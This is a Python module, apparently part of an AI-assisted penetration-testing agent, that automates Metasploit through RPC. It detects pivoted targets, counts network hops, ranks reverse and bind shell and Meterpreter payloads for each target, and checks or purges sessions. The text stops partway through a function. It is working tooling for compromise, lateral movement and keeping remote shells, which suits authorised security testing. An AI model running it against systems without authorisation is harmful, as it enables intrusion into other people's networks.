# coder_tools.py
import json
import re
import time
import socket
import ipaddress
from typing import Union
from core.rpc_client import msf_client
from config import ATTACKER_LHOST, ATTACKER_LPORT

def _resolve_docker_lhost(target_ip: str) -> str:
    """
    Detects if Metasploit is running in a Docker container, and if so,
    tries to find the container's IP address on the network matching target_ip's subnet.
    """
    import subprocess
    import json
    import ipaddress
    try:
        # Resolve target IP if it is a hostname
        try:
            target_ip = socket.gethostbyname(target_ip)
        except Exception:
            pass

        # Find Metasploit container name
        cmd_port = ["docker", "ps", "--filter", "publish=55553", "--format", "{{.Names}}"]
        proc = subprocess.run(cmd_port, capture_output=True, text=True, check=True)
        container_name = proc.stdout.strip()
        if not container_name:
            cmd_img = ["docker", "ps", "--filter", "ancestor=metasploitframework/metasploit-framework", "--format", "{{.Names}}"]
            proc = subprocess.run(cmd_img, capture_output=True, text=True, check=True)
            container_name = proc.stdout.strip().split("\n")[0]
        
        if not container_name:
            return None
        
        # Inspect container networks
        cmd_inspect = ["docker", "inspect", container_name]
        proc = subprocess.run(cmd_inspect, capture_output=True, text=True, check=True)
        info = json.loads(proc.stdout)
        if not info or not isinstance(info, list):
            return None
        
        networks = info[0].get("NetworkSettings", {}).get("Networks", {})
        target_addr = ipaddress.ip_address(target_ip)
        
        candidate_ips = []
        for net_name, net_info in networks.items():
            ip_str = net_info.get("IPAddress")
            if not ip_str:
                continue
            prefix_len = net_info.get("IPPrefixLen", 16)
            net = ipaddress.ip_network(f"{ip_str}/{prefix_len}", strict=False)
            if target_addr in net:
                return ip_str
            if net_name != "bridge":
                candidate_ips.insert(0, ip_str)
            else:
                candidate_ips.append(ip_str)

        # If Metasploit is running in Docker and target is on an internal subnet
        # (reached via pivot), return the Metasploit container's primary IP
        # rather than None (which would cause fallback to the host bridge gateway .1).
        if candidate_ips:
            return candidate_ips[0]
    except Exception:
        pass
    return None


def _is_pivoted_target(target_ip: str) -> bool:
    """
    Returns True when target_ip is reachable only via a Metasploit autoroute
    (i.e. it is NOT on a network where the MSF container has a direct interface).

    Strategy (from cheapest to most expensive):
    1. If _resolve_docker_lhost() returns an IP that lives on the SAME subnet as
       target_ip, the target is directly reachable → not pivoted.
    2. If Metasploit's active route table shows a route covering target_ip, the
       target is behind an autoroute → pivoted.
    """
    try:
        target_addr = ipaddress.ip_address(socket.gethostbyname(target_ip))
    except Exception:
        return False

    # 1. Direct subnet check: MSF container has an interface on target's subnet
    try:
        import subprocess, json as _json
        cmd = ["docker", "ps", "--filter", "publish=55553", "--format", "{{.Names}}"]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        cname = p.stdout.strip()
        if cname:
            p2 = subprocess.run(["docker", "inspect", cname], capture_output=True, text=True, timeout=3)
            info = _json.loads(p2.stdout)
            if info and isinstance(info, list):
                nets = info[0].get("NetworkSettings", {}).get("Networks", {})
                for _, net_info in nets.items():
                    ip_str = net_info.get("IPAddress")
                    prefix  = net_info.get("IPPrefixLen", 24)
                    if ip_str:
                        try:
                            net = ipaddress.ip_network(f"{ip_str}/{prefix}", strict=False)
                            if target_addr in net:
                                return False  # direct route exists
                        except Exception:
                            pass
    except Exception:
        pass

    # 2. Read active Metasploit route table via RPC (session.list routes field).
    # NOTE: Metasploit only populates session.routes for Meterpreter sessions that
    # directly own the route. Shell/cmd sessions show an empty routes field even when
    # a route was added via core.route_add. So this is a best-effort check.
    try:
        sessions_res = msf_client.call("session.list")
        if isinstance(sessions_res, dict):
            for sid, sinfo in sessions_res.items():
                if not isinstance(sinfo, dict):
                    continue
                routes_str = str(sinfo.get("routes", ""))
                if not routes_str:
                    continue
                # routes is a comma-separated list like "10.10.1.0/255.255.255.0,10.10.2.0/255.255.255.0"
                for segment in routes_str.split(","):
                    segment = segment.strip()
                    if not segment:
                        continue
                    try:
                        if "/" in segment:
                            parts = segment.split("/", 1)
                            # Support both CIDR ("10.10.1.0/24") and dotted ("10.10.1.0/255.255.255.0")
                            if parts[1].isdigit():
                                net = ipaddress.ip_network(segment, strict=False)
                            else:
                                # netmask notation
                                net = ipaddress.IPv4Network(
                                    f"{parts[0]}/{parts[1]}", strict=False
                                )
                            if target_addr in net:
                                return True
                    except Exception:
                        pass
    except Exception:
        pass

    # 3. Query the AKG (authoritative pivot store).
    # msf_add_route() always calls akg_add_pivot() which writes a PIVOTS_INTO edge.
    # This is the most reliable source because it covers ALL pivot paths regardless
    # of session type (Meterpreter or shell) and route ownership.
    try:
        from core.knowledge_graph import get_graph
        g = get_graph()
        for n in g._nodes.values():
            if n.type == "Subnet":
                cidr = n.properties.get("cidr", "")
                if not cidr:
                    continue
                # Check if this subnet has a PIVOTS_INTO edge (i.e. it's an internal pivot target)
                has_pivot_edge = any(
                    e.type == "PIVOTS_INTO" and e.to_node == n.id
                    for e in g._edges.values()
                )
                if not has_pivot_edge:
                    continue
                try:
                    net = ipaddress.ip_network(cidr, strict=False)
                    if target_addr in net:
                        return True
                except Exception:
                    pass
    except Exception:
        pass

    return False


def _count_pivot_hops(target_ip: str) -> int:
    """
    Returns the number of autoroute pivot hops needed to reach target_ip from
    the attacker's position, by traversing PIVOTS_INTO edges in the AKG (BFS).

    0  = target is on the attacker/directly-reachable network
    1  = single autoroute hop (standard pivot)
    N  = N autoroute hops (multi-hop pivot — reverse payloads unreliable at N>=2)

    Falls back to 0 on any error so callers never fail due to graph absence.
    """
    from collections import deque
    import ipaddress as _ip

    try:
        try:
            target_addr = _ip.ip_address(socket.gethostbyname(target_ip))
        except Exception:
            target_addr = _ip.ip_address(target_ip)

        from core.knowledge_graph import get_graph
        g = get_graph()

        # 1. Locate target_ip's subnet node in the AKG
        target_subnet_id = None
        for n in g._nodes.values():
            if n.type != "Subnet":
                continue
            cidr = n.properties.get("cidr", "")
            if not cidr:
                continue
            try:
                if target_addr in _ip.ip_network(cidr, strict=False):
                    if n.properties.get("is_attacker_network", False):
                        return 0  # direct attacker subnet
                    target_subnet_id = n.id
                    break
            except Exception:
                pass

        if target_subnet_id is None:
            return 0  # not in AKG → assume direct

        # 2. Build per-ExploitStep → source-subnet mapping for BFS edge labeling
        exploit_to_src_subnet: dict[str, str] = {}
        for edge in g._edges.values():
            if edge.type != "COMPROMISES":
                continue
            host_node = g._nodes.get(edge.to_node)
            if not host_node:
                continue
            host_ip_str = host_node.properties.get("ip", "")
            if not host_ip_str:
                continue
            try:
                h_addr = _ip.ip_address(host_ip_str)
            except Exception:
                continue
            for sn in g._nodes.values():
                if sn.type != "Subnet":
                    continue
                sn_cidr = sn.properties.get("cidr", "")
                if not sn_cidr:
                    continue
                try:
                    if h_addr in _ip.ip_network(sn_cidr, strict=False):
                        exploit_to_src_subnet[edge.from_node] = sn.id
                        break
                except Exception:
                    pass

        # 3. Build adjacency: source_subnet_id → [dest_subnet_ids] via PIVOTS_INTO
        adjacency: dict[str, list] = {}
        for edge in g._edges.values():
            if edge.type != "PIVOTS_INTO":
                continue
            src = exploit_to_src_subnet.get(edge.from_node)
            if src:
                adjacency.setdefault(src, []).append(edge.to_node)

        # 4. BFS from all attacker subnets (depth 0)
        visited: dict[str, int] = {}
        queue: deque = deque()
        for n in g._nodes.values():
            if n.type == "Subnet" and n.properties.get("is_attacker_network", False):
                if n.id not in visited:
                    visited[n.id] = 0
                    queue.append((n.id, 0))

        while queue:
            cur_id, hops = queue.popleft()
            if cur_id == target_subnet_id:
                return hops
            for nxt in adjacency.get(cur_id, []):
                if nxt not in visited:
                    visited[nxt] = hops + 1
                    queue.append((nxt, hops + 1))

        # Subnet in AKG but no BFS path yet (pivot not yet established in graph).
        # Return 1 so multi-hop logic still applies (conservative).
        return 1

    except Exception:
        return 0


def _select_pivot_target_index(module_path: str) -> str | None:
    """
    When the target is behind a pivot, inspect the module's target list and
    prefer an in-memory / command execution target over a dropper.

    A "dropper" target is one that stages a payload by downloading a binary
    from the attacker (via CmdStager/curl/wget), which requires the victim to
    reach Kali directly — impossible in a multi-hop pivot scenario.

    An "in-memory" / "command" target executes entirely via the existing exploit
    channel, so no outbound connection from the victim is needed.

    Returns the target index (as string) to set, or None to leave Metasploit's
    default target unchanged.
    """
    try:
        clean_mod = module_path.replace("exploit/", "", 1)
        info = msf_client.call("module.info", "exploit", clean_mod)
        if not isinstance(info, dict) or "error" in info:
            return None

        targets = info.get("targets", {})
        if not targets or len(targets) <= 1:
            return None

        # Only override target if default target (index 0) is actually a dropper
        t0_name = str(targets.get(0, targets.get("0", ""))).lower()
        t0_is_dropper = any(kw in t0_name for kw in ["dropper", "download", "stager", "fetch"])
        if not t0_is_dropper:
            return None

        # Keyword signatures for dropper vs in-memory targets
        dropper_kw  = ["dropper", "download", "stager", "exe", "elf", "pe", "binary", "msi"]
        memory_kw   = ["memory", "in-memory", "in memory", "command", "cmd",
                       "unix", "shell", "script", "java", "python", "perl", "ruby",
                       "reflect", "shellcode"]

        best_idx  = None
        best_score = -1

        for idx_key, tname in targets.items():
            tname_l = str(tname).lower()
            score = 0
            for kw in memory_kw:
                if kw in tname_l:
                    score += 3
            for kw in dropper_kw:
                if kw in tname_l:
                    score -= 5
            if score > best_score:
                best_score = score
                best_idx   = str(idx_key)

        # Only override if the best target is clearly in-memory (score > 0)
        # and is not already the default (index 0)
        if best_idx is not None and best_score > 0 and best_idx != "0":
            return best_idx
    except Exception:
        pass
    return None



# 
# ─────────────────────────────────────────────────────────────────────────────
# Payload Metadata Engine — zero hardcoded hints
#
# MSF payload names encode all the information we need:
#   {platform}/{arch}/{session_type}/{connection}   (staged)
#   {platform}/{arch}/{session_type}_{connection}   (stageless)
#   cmd/{sub_platform}/{connection}                  (text/shell)
#   generic/{session_type}_{connection}              (fallback)
#
# We parse the name, then score each candidate purely on structural properties
# vs the target context. No module names, no keyword tables, no lookup dicts.
# ─────────────────────────────────────────────────────────────────────────────

_NATIVE_PLATFORMS = frozenset([
    "linux", "windows", "osx", "android", "bsd", "solaris", "aix", "irix",
])
_INTERPRETER_PLATFORMS = frozenset([
    "php", "python", "ruby", "java", "nodejs", "perl",
])
_KNOWN_ARCHES = frozenset([
    "x86", "x64", "x86_64", "arm", "arm64", "aarch64", "mips",
    "mipsle", "mipsbe", "ppc", "ppc64",
])
_SESSION_TYPES = frozenset([
    "meterpreter", "shell", "vncinject", "exec", "powershell",
])
# Ordered from most reliable to least reliable in a pivot scenario
_CONNECTION_ORDER = [
    "reverse_tcp", "reverse_http", "reverse_https",
    "bind_tcp", "reverse_sctp", "reverse_named_pipe",
    "reverse_ipv6_tcp", "reverse", "bind", "find_port",
    "interact", "",
]
# Normalize common arch aliases to canonical form
_ARCH_NORM = {
    "x86_64": "x64", "amd64": "x64",
    "i386": "x86", "i686": "x86",
    "aarch64": "arm64",
}
# OS keyword → canonical native platform name
_OS_PLATFORM = [
    ("linux",   ["linux", "debian", "ubuntu", "centos", "alpine", "fedora", "redhat", "unix"]),
    ("windows", ["windows", "win32", "win64", "microsoft", "ntlm"]),
    ("osx",     ["macos", "osx", "darwin", "apple"]),
    ("android", ["android"]),
    ("bsd",     ["bsd", "freebsd", "openbsd"]),
]


def _parse_payload_name(payload: str) -> dict:
    """
    Parse a Metasploit payload name into its structural components.

    Returns a dict with:
      platform     – e.g. "linux", "windows", "php", "cmd", "generic"
      arch         – e.g. "x86", "x64", "" (empty = not arch-specific)
      session_type – "meterpreter" | "shell" | "vncinject" | ...
      connection   – "reverse_tcp" | "bind_tcp" | "reverse" | ...
      is_staged    – True when stage+stager are separate (e.g. linux/x86/meterpreter/reverse_tcp)
      is_native    – True for ELF/PE platforms (linux, windows, osx, …)
      is_interpreter – True for php, python, ruby, …
    """
    parts = payload.lower().strip().split("/")

    result = {
        "platform":       "generic",
        "arch":           "",
        "session_type":   "shell",
        "connection":     "",
        "is_staged":      False,
        "is_native":      False,
        "is_interpreter": False,
    }

    if not parts or not parts[0]:
        return result

    platform = parts[0]
    result["platform"]       = platform
    result["is_native"]      = platform in _NATIVE_PLATFORMS
    result["is_interpreter"] = platform in _INTERPRETER_PLATFORMS
    remaining = parts[1:]

    def _extract_conn(s: str) -> str:
        for c in _CONNECTION_ORDER:
            if c and c in s:
                return c
        return ""

    if platform == "cmd":
        # May be cmd/unix/reverse_bash, cmd/unix/interact
        # OR cmd/linux/http/x64/meterpreter_reverse_tcp, cmd/windows/http/x64/meterpreter_reverse_tcp
        last = remaining[-1] if remaining else ""
        result["connection"] = _extract_conn(last)
        if not result["connection"] and len(remaining) > 1:
            result["connection"] = _extract_conn(remaining[1])

        p_lower = payload.lower()
        if "meterpreter" in p_lower:
            result["session_type"] = "meterpreter"
            result["is_staged"] = "/meterpreter/" in p_lower
        else:
            result["session_type"] = "shell"
            result["is_staged"] = False

        for part in remaining:
            if part in _KNOWN_ARCHES or part in _ARCH_NORM:
                result["arch"] = part
                break
        if not result["arch"] and remaining:
            result["arch"] = remaining[0]

        for part in remaining:
            if part in _NATIVE_PLATFORMS:
                result["target_platform"] = part
                break

    elif platform == "generic":
        # generic/shell_reverse_tcp  generic/custom
        last = remaining[-1] if remaining else ""
        result["connection"] = _extract_conn(last)
        if "meterpreter" in last:
            result["session_type"] = "meterpreter"

    elif platform in _INTERPRETER_PLATFORMS:
        # php/meterpreter/reverse_tcp (staged)
        # python/shell_reverse_tcp   (stageless)
        if remaining and remaining[0] in _SESSION_TYPES:
            result["session_type"] = remaining[0]
            result["is_staged"]    = True
            result["connection"]   = remaining[1] if len(remaining) > 1 else ""
        elif remaining:
            last = remaining[-1]
            result["connection"]   = _extract_conn(last)
            result["session_type"] = "meterpreter" if "meterpreter" in last else "shell"

    else:
        # Native platform: linux/x86/meterpreter/reverse_tcp
        #                  linux/x86/shell_reverse_tcp
        #                  windows/x64/meterpreter_reverse_tcp
        if remaining and remaining[0] in _KNOWN_ARCHES:
            result["arch"] = remaining[0]
            remaining = remaining[1:]

        if remaining:
            if remaining[0] in _SESSION_TYPES:
                # staged: separate session_type and connection segments
                result["session_type"] = remaining[0]
                result["is_staged"]    = True
                result["connection"]   = remaining[1] if len(remaining) > 1 else ""
            else:
                # stageless: session_type_connection fused in last segment
                last = remaining[-1]
                result["connection"] = _extract_conn(last)
                if "meterpreter" in last:
                    result["session_type"] = "meterpreter"
                elif "shell" in last or "powershell" in last:
                    result["session_type"] = "shell"

    # Normalize arch
    result["arch"] = _ARCH_NORM.get(result["arch"], result["arch"])

    return result


def _resolve_target_platform(target_os: str) -> str:
    """Map a free-form OS string to a canonical native platform name, or '' if unknown."""
    os_l = target_os.lower()
    for plat, kws in _OS_PLATFORM:
        if any(k in os_l for k in kws):
            return plat
    return ""


def _score_payload(
    payload: str,
    target_os: str,
    target_arch: str,
    prefer_meterpreter: bool,
    all_compat: list,
    is_cgi: bool = False,
    is_pivot: bool = False,
) -> tuple:
    """
    Score a single payload against target context. Lower = better.

    Axes (in priority order):
      1. Platform compatibility  — native match > interpreter > generic > wrong
      2. cmd/unix penalty        — deprioritised when binary payloads are available (unless CGI where cmd/bind is preferred)
      3. Architecture match      — exact > compatible (x86 on x64) > mismatch
      4. Session type            — meterpreter vs shell per prefer_meterpreter
      5. Connection type         — reverse_tcp > bind_tcp > others (bind_tcp preferred for CGI)
      6. Staged vs stageless     — stageless preferred (more reliable over pivots and in CGI)
    """
    p = _parse_payload_name(payload)
    target_plat = _resolve_target_platform(target_os)
    target_arch_n = _ARCH_NORM.get(target_arch.lower(), target_arch.lower())

    # ── 1. Platform score ────────────────────────────────────────────────────
    # 0 = exact native match,  1 = interpreter (flexible),
    # 2 = generic fallback,    3 = cmd/unix (text-based),
    # 4 = wrong native platform
    if p["platform"] == "generic":
        s_platform = 2
    elif p["platform"] == "cmd":
        p_tgt_plat = p.get("target_platform")
        if target_plat and p_tgt_plat and p_tgt_plat != target_plat:
            s_platform = 4  # wrong OS (e.g. cmd/windows on linux)
        elif is_cgi:
            # For CGI/Shellshock: direct command payloads (e.g. netcat bind) are rock-solid (no CMDstager drop needed)
            s_platform = 0
        elif p.get("session_type") == "meterpreter":
            # Native meterpreter delivered via cmd injection (e.g. cmd/linux/http/x64/meterpreter_reverse_tcp)
            # Highly effective on minimal web/java containers without curl/wget droppers
            s_platform = 0
        else:
            has_binary = any(
                _parse_payload_name(q)["is_native"] or _parse_payload_name(q)["is_interpreter"]
                for q in all_compat
                if not q.startswith("cmd/") and not q.startswith("generic/")
            )
            s_platform = 3 if has_binary else 1
    elif p["is_interpreter"]:
        s_platform = 1
    elif p["is_native"]:
        if not target_plat:
            s_platform = 0          # no OS hint → assume compatible
        elif p["platform"] == target_plat:
            s_platform = 0          # exact match
        else:
            s_platform = 4          # wrong OS (e.g. windows payload for linux target)
    else:
        s_platform = 2

    # ── 2. Architecture score ────────────────────────────────────────────────
    # 0 = exact, 1 = compatible (x86 on x64), 2 = neutral fallback, 4 = mismatch
    if not target_arch_n:
        # Canonical server/desktop priority when target arch is unspecified: x64 > x86 > arm > mips/others
        if p["arch"] in ("x64", "x86_64", "amd64"):
            s_arch = 0
        elif p["arch"] in ("x86", "i386", "i686"):
            s_arch = 1
        elif p["arch"] in ("arm64", "aarch64", "arm"):
            s_arch = 2
        elif not p["arch"]:
            s_arch = 2
        else:
            s_arch = 4  # exotic arches like mips, mips64, ppc, sparc
    elif not p["arch"]:
        s_arch = 2                  # no arch info: neutral
    elif p["arch"] == target_arch_n:
        s_arch = 0
    elif p["arch"] == "x86" and target_arch_n == "x64":
        s_arch = 1                  # 32-bit payload runs on 64-bit, not ideal
    else:
        s_arch = 4

    # ── 3. Session type ──────────────────────────────────────────────────────
    is_meter = "meterpreter" in p["session_type"]
    s_session = 0 if is_meter == prefer_meterpreter else 1

    # ── 4. Connection type ───────────────────────────────────────────────────
    if is_cgi:
        # In CGI/Shellshock, bind_tcp is cleaner as it doesn't require reverse handler handshake before CGI exit
        conn_order = ["bind_tcp", "bind", "reverse_tcp", "reverse"]
        try:
            s_conn = conn_order.index(p["connection"])
        except ValueError:
            s_conn = len(conn_order)
    else:
        try:
            s_conn = _CONNECTION_ORDER.index(p["connection"])
        except ValueError:
            s_conn = len(_CONNECTION_ORDER)

    # ── 5. Staged vs stageless ───────────────────────────────────────────────
    # For native platforms (linux, windows), stageless payloads are self-contained
    # and preferred over pivot tunnels. For interpreter platforms (php, python, ruby),
    # staged payloads are required for reliable session initialization and RPC restore.
    if p["is_interpreter"]:
        s_staged = 0 if p["is_staged"] else 1
    else:
        s_staged = 1 if p["is_staged"] else 0

    return (s_platform, s_arch, s_session, s_conn, s_staged, payload.lower())


def _get_counterpart_payload(payload: str, compat_payloads: list) -> str | None:
    """
    Given a payload (e.g. 'linux/x64/meterpreter_reverse_tcp' [unstaged]),
    returns its direct staged counterpart ('linux/x64/meterpreter/reverse_tcp')
    if present in compat_payloads, or vice-versa.
    """
    if not payload:
        return None
    p_lower = payload.lower()
    counterpart = None
    if "_reverse" in p_lower:
        variant = p_lower.replace("_reverse", "/reverse")
        for p in compat_payloads:
            if p.lower() == variant:
                counterpart = p
                break
    elif "/reverse" in p_lower:
        variant = p_lower.replace("/reverse", "_reverse")
        for p in compat_payloads:
            if p.lower() == variant:
                counterpart = p
                break
    return counterpart


def _smart_select_payload(
    compat_payloads: list,
    module_path: str = "",      # used for CGI/Shellshock detection & scoring
    banner: str = "",           # kept for backward-compat, no longer used
    target_os: str = "",
    target_arch: str = "",
    prefer_meterpreter: bool = True,
    is_pivot: bool = False,     # True when target is behind an autoroute pivot
    hop_count: int = 0,         # AKG hop depth; >= 2 promotes bind_tcp as primary choice
) -> dict:
    """
    Metadata-driven payload selection engine.

    Ranks each compatible payload on its structural properties
    vs the target context and module constraints.

    Returns:
      suggested_payload  – single best candidate
      top_candidates     – ordered list of up to 5 alternatives (with staged/unstaged counterpart forced as #2)
      scoring_hints      – dict with parsed metadata of the best payload and fallback counterpart
    """
    TOP_N = 5

    if not compat_payloads:
        return {
            "suggested_payload": "generic/shell_reverse_tcp",
            "top_candidates":    [],
            "bind_candidates":   [],
            "guidance":          "No compatible payloads available.",
            "scoring_hints":     {"reason": "no compatible payloads available"},
        }

    mod_lower = module_path.lower()
    is_cgi = any(tok in mod_lower for tok in ["cgi", "bash_env", "shellshock"])
    eff_prefer_meterpreter = False if is_cgi else prefer_meterpreter

    ranked = sorted(
        compat_payloads,
        key=lambda p: _score_payload(
            p, target_os, target_arch, eff_prefer_meterpreter,
            compat_payloads, is_cgi=is_cgi,
        ),
    )
    best = ranked[0]

    # Find staged/unstaged counterpart of the best payload and ensure it is candidate #2
    counterpart = _get_counterpart_payload(best, compat_payloads)
    top_list = [best]
    if counterpart and counterpart in ranked:
        top_list.append(counterpart)
    for p in ranked:
        if p not in top_list:
            top_list.append(p)
        if len(top_list) >= TOP_N:
            break

    # Secondary section: rank best bind payloads for targets behind deep pivots / isolated networks
    bind_candidates = []
    bind_payloads = [p for p in compat_payloads if "bind" in p.lower()]
    if bind_payloads:
        ranked_bind = sorted(
            bind_payloads,
            key=lambda p: _score_payload(
                p, target_os, target_arch, eff_prefer_meterpreter,
                bind_payloads, is_cgi=is_cgi,
            ),
        )
        for p in ranked_bind:
            if p not in bind_candidates:
                bind_candidates.append(p)
            if len(bind_candidates) >= 3:
                break

    guidance = (
        "Use 'suggested_payload' or 'top_candidates' (reverse connection) as the primary choice. "
        "If the target is behind an isolated network or multi-hop pivot unable to route outbound traffic back to LHOST, "
        "retry using a payload from 'bind_candidates' (which makes the target listen for inbound connections instead)."
    )

    hints = {
        "target_os":         target_os  or "(not provided)",
        "target_arch":       target_arch or "(not provided)",
        "prefer_meterpreter": eff_prefer_meterpreter,
        "is_cgi_exploit":    is_cgi,
        "resolved_platform": _resolve_target_platform(target_os),
        "best_payload_meta": _parse_payload_name(best),
        "counterpart_fallback": counterpart or "(no direct staged/unstaged counterpart found in compat list)",
    }
    # For multi-hop pivot (>=2 hops), bind_tcp is the reliable primary choice:
    # MSF connects TO the target outward through the autoroute chain instead of
    # waiting for an inbound reverse connection that cannot traverse double-autoroute.
    if hop_count >= 2 and bind_candidates:
        suggested = bind_candidates[0]
        # Merge bind first, then any remaining reverse candidates
        candidates = bind_candidates + [p for p in top_list if p not in bind_candidates]
        candidates = candidates[:TOP_N]
    else:
        suggested = best
        candidates = top_list

    return {
        "suggested_payload": suggested,
        "top_candidates": candidates,
        "bind_candidates": bind_candidates,
        "guidance": guidance,
        "scoring_hints": hints,
    }


# Keep backward-compatible alias used internally
def _rank_payloads(compat_payloads: list, module_path: str) -> dict:
    """Backward-compatible wrapper — calls _smart_select_payload with no extra context."""
    return _smart_select_payload(compat_payloads, module_path)


def _verify_session_alive(session_id: Union[str, int]) -> bool:
    """
    Verifies if a session is active and responsive without blocking msfrpcd.
    Safe and non-destructive implementation for ALL Metasploit session types.
    """
    try:
        sessions_res = msf_client.call("session.list")
        sessions = sessions_res if isinstance(sessions_res, dict) else {}
        sessions.pop("error", None)

        sid_str = str(session_id)
        sid_int = int(session_id) if sid_str.isdigit() else None

        session_info = None
        if sid_str in sessions:
            session_info = sessions[sid_str]
        elif sid_int is not None and sid_int in sessions:
            session_info = sessions[sid_int]

        if not session_info:
            return False

        session_type = str(session_info.get("type", "shell")).lower()
        via_payload = str(session_info.get("via_payload", "")).lower()

        # Ephemeral interact payloads (e.g. vsftpd backdoor) die if read/probed aggressively.
        # Presence in session.list is sufficient proof for interact sessions.
        if "interact" in via_payload:
            return True

        if session_type == "meterpreter":
            # Quick check: if meterpreter_read returns an error, socket is closed
            read_res = msf_client.call("session.meterpreter_read", sid_str)
            if isinstance(read_res, dict) and read_res.get("error"):
                return False

            # Send a non-intrusive probe (getuid) with a brief timeout
            msf_client.call("session.meterpreter_run_single", sid_str, "getuid")
            max_wait = 2.0
            elapsed = 0.0
            step = 0.3
            while elapsed < max_wait:
                time.sleep(step)
                elapsed += step
                read_res = msf_client.call("session.meterpreter_read", sid_str)
                if isinstance(read_res, dict) and read_res.get("error"):
                    return False
                data = read_res.get("data", "") if isinstance(read_res, dict) else ""
                if isinstance(data, str) and ("Server username:" in data or "uid=" in data or data.strip()):
                    return True
            # Socket did not report error; trust session is alive even if response is slow over pivot
            return True
        else:
            # Standard shell verification: check if shell_read returns error (socket closed)
            # Never execute blocking multi-second write/read loops that freeze msfrpcd Ruby thread
            flush_res = msf_client.call("session.shell_read", sid_str, timeout=3)
            if isinstance(flush_res, dict) and flush_res.get("error"):
                return False
            return True
    except Exception:
        return False


def msf_purge_dead_sessions() -> list[str]:
    """
    Scans all sessions currently registered in Metasploit RPC.
    If a session is confirmed dead (socket disconnected/error), sends 'session.stop' to purge it.

    Returns:
        List of purged session IDs.
    """
    purged = []
    try:
        sessions_res = msf_client.call("session.list")
        if isinstance(sessions_res, dict) and "error" not in sessions_res:
            for sid_str, info in list(sessions_res.items()):
                if sid_str == "error":
                    continue
                via_payload = str(info.get("via_payload", "")).lower()
                if "interact" in via_payload:
                    continue

                if not _verify_session_alive(sid_str):
                    try:
                        msf_client.call("session.stop", str(sid_str))
                        purged.append(str(sid_str))
                    except Exception:
                        pass
    except Exception:
        pass

    return purged




def _parse_rhosts(rhosts_str: str):
    """
    Parses Metasploit RHOSTS values which can be single IPs, CIDR networks,
    space/comma-separated lists, octet ranges (10.0.0.1-10), full IP ranges (10.0.0.1-10.0.0.10),
    or hostnames.
    Returns:
      (target_ips: Set[ipaddress.IPv4Address|IPv6Address],
       target_networks: List[ipaddress.IPv4Network|IPv6Network],
       target_hostnames: Set[str])
    """
    def _resolve_ip(host: str) -> str:
        try:
            return socket.gethostbyname(host)
        except Exception:
            return host

    parts = rhosts_str.replace(",", " ").split()
    ips = set()
    networks = []
    hostnames = set()

    for part in parts:
        part = part.strip()
        if not part:
            continue

        # Check for range: e.g. 192.168.1.1-10 or 192.168.1.1-192.168.1.10
        if "-" in part:
            try:
                start_str, end_str = part.split("-", 1)
                start_str = start_str.strip()
                end_str = end_str.strip()
                if "." in end_str or ":" in end_str:
                    # Full IP address range, e.g. 192.168.1.1-192.168.1.10
                    start_ip = ipaddress.ip_address(start_str)
                    end_ip = ipaddress.ip_address(end_str)
                else:
                    # Octet range, e.g. 192.168.1.1-10 (IPv4 only)
                    start_ip = ipaddress.IPv4Address(start_str)
                    octets = start_str.split(".")
                    octets[-1] = end_str
                    end_ip = ipaddress.IPv4Address(".".join(octets))
                
                start_int = int(start_ip)
                end_int = int(end_ip)
                if start_int > end_int:
                    start_int, end_int = end_int, start_int
                for ip_int in range(start_int, end_int + 1):
                    ips.add(ipaddress.ip_address(ip_int))
                continue
            except Exception:
                pass

        # Check for CIDR network: e.g. 192.168.1.0/24 or fe80::/64
        if "/" in part:
            try:
                net = ipaddress.ip_network(part, strict=False)
                networks.append(net)
                continue
            except Exception:
                pass

        # Check if single IP
        try:
            ip = ipaddress.ip_address(part)
            ips.add(ip)
            continue
        except Exception:
            pass

        # Treat as hostname
        hostnames.add(part)
        resolved = _resolve_ip(part)
        if resolved != part:
            hostnames.add(resolved)
            try:
                ips.add(ipaddress.ip_address(resolved))
            except Exception:
                pass

    return ips, networks, hostnames


def _get_session_ips(info: dict) -> list:
    ips = []
    if "session_host" in info:
        ips.append(str(info["session_host"]))
    if "target_host" in info:
        ips.append(str(info["target_host"]))
    if "tunnel_peer" in info and isinstance(info["tunnel_peer"], str):
        peer = info["tunnel_peer"]
        if ":" in peer:
            ip_part = peer.rsplit(":", 1)[0].strip("[]")
            ips.append(ip_part)
        else:
            ips.append(peer)
    return [ip for ip in ips if ip]


def _is_ip_match(session_ip_str: str, target_ips: set, target_networks: list, target_hostnames: set, has_loopback_target: bool) -> bool:
    try:
        session_ip = ipaddress.ip_address(session_ip_str)
        # 1. Direct match in target_ips
        if session_ip in target_ips:
            return True
        # 2. Network/CIDR match
        if any(session_ip in net for net in target_networks):
            return True
        # 3. Loopback match
        if has_loopback_target and session_ip.is_loopback:
            return True
    except Exception:
        pass
    
    # 4. String/hostname match
    if session_ip_str in target_hostnames:
        return True
    
    return False


_NATIVE_ARCH_TOKENS = frozenset([
    "x86", "x64", "x86_64", "arm", "arm64", "aarch64",
    "mips", "mipsle", "mipsbe", "ppc", "ppc64",
])

def _get_effective_compat_payloads(module_path: str) -> list:
    compat_payloads: list = []
    try:
        compat_res = msf_client.call("module.compatible_payloads", module_path)
        if isinstance(compat_res, dict) and "payloads" in compat_res:
            compat_payloads = list(compat_res["payloads"])
    except Exception:
        pass

    # Also query payloads for all targets (e.g. Target 1 Unix in-memory) so multi-target modules are fully supported
    try:
        clean_mod = module_path.replace("exploit/", "", 1)
        info = msf_client.call("module.info", "exploit", clean_mod)
        if isinstance(info, dict) and "targets" in info and isinstance(info["targets"], dict):
            for tidx in info["targets"].keys():
                try:
                    t_res = msf_client.call("module.target_compatible_payloads", module_path, int(tidx))
                    if isinstance(t_res, dict) and "payloads" in t_res:
                        for p in t_res["payloads"]:
                            if p not in compat_payloads:
                                compat_payloads.append(p)
                except Exception:
                    pass
    except Exception:
        pass

    _is_limited_cmd = (
        not compat_payloads
        or (len(compat_payloads) <= 3 and all(p.startswith("cmd/unix") for p in compat_payloads))
    )

    if _is_limited_cmd:
        try:
            info = msf_client.call("module.info", "exploit", module_path.replace("exploit/", "", 1))
            mod_platform = ""
            mod_arch = ""
            has_native_arch = False
            if isinstance(info, dict):
                raw_platform = str(info.get("platform", "")).lower()
                raw_arch     = str(info.get("arch", "")).lower()
                raw_targets  = str(info.get("targets", "")).lower()

                # Verifica che l'arch dichiarata o i target contengano architetture native
                has_native_arch = any(tok in raw_arch or tok in raw_targets for tok in _NATIVE_ARCH_TOKENS)

                if "linux" in raw_platform or "unix" in raw_platform or "linux" in raw_targets: mod_platform = "linux"
                elif "windows" in raw_platform or "windows" in raw_targets:                      mod_platform = "windows"
                elif "php" in raw_platform:                          mod_platform = "php"
